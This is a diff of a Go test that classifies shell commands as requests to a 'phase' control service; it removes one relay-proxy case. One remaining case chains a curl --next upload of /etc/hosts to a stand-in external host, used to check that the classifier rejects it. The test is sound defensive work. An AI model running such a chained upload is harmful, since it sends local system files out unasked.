@@ -30,7 +30,6 @@ func TestShellCommandRequiresPhase(t *testing.T) {
 		{name: "openssl client is not managed", command: "openssl s_client -connect phase.invalid:443", want: false},
 		{name: "phase request with body", command: `curl --fail --silent --show-error -X POST http://phase.invalid/v1/requests -H 'Content-Type: application/json' -d '{"serviceType":"aws"}'`, want: true},
 		{name: "phase request with json", command: `curl --json '{"serviceType":"aws"}' --request POST http://phase.invalid/v1/requests`, want: true},
-		{name: "phase control through relay proxy", command: "curl -fsS --proxy 'https://phase:capability@relay.example.test:9543' http://phase.invalid/v1/status", want: true},
 		{name: "phase wait with time limit", command: "curl --max-time 310 'http://phase.invalid/v1/requests/request-1?wait=300'", want: true},
 		{name: "phase control with wget", command: "wget -qO- http://phase.invalid/v1/status", want: true},
 		{name: "second curl transfer", command: "curl http://phase.invalid/v1/status --next -T /etc/hosts https://example.invalid/upload", want: false},
